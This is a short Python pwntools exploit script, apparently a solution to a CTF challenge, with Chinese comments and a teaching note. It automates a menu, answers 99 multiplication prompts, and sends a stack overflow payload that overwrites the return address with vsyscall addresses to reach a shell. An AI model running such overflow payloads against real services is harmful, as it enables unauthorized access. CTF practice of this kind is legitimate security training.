from pwn import *

context.log_level = 'debug'

#io = process('./pwn')
io = remote('pwn.challenge.ctf.show', 28162)
libc = ELF('./libc-2.23.so')

# vsyscall_add = 0xffffffffff600000：vsyscall区域的地址
vsyscall_add = 0xffffffffff600000

# 交互流程：选择2 -> 选择1 -> 输入0 -> 输入-378
io.sendlineafter("Choice:\n", "2")
io.sendlineafter("Choice:\n", "1")
io.sendlineafter("doubts?\n", "0")
io.sendlineafter("more?\n", "-378")

# 循环回答99个问题
for i in range(99):
    io.recvuntil("Question: ")
    answer1 = int(io.recvuntil(" ")[:-1])
    io.recvuntil("* ")
    answer2 = int(io.recvuntil(" ")[:-1])
    io.sendlineafter("Answer:", str(answer1*answer2))

# 构造payload：0x30个'A' + 0x8个'B' + vsyscall_add地址 * 3
payload = b'A' * 0x30
payload += b'B' * 0x8
payload += p64(vsyscall_add) * 3

io.sendafter("Answer:", payload)
io.interactive()

"""
【知识点讲解】
1. 题目类型：vsyscall - vsyscall区域利用
2. 核心原理：
   - 利用vsyscall区域的地址，这是一个固定的内存区域
   - 构造payload覆盖返回地址为vsyscall地址
3. 关键步骤：
   - 完成交互流程，回答99个乘法问题
   - 构造payload，包含vsyscall地址
   - 发送payload触发漏洞
4. 执行流程：
   - 交互流程 -> 回答问题 -> 构造payload -> 发送payload -> 获取shell
5. 技术要点：
   - vsyscall区域的利用
   - 交互流程的处理
   - payload的构造
"""
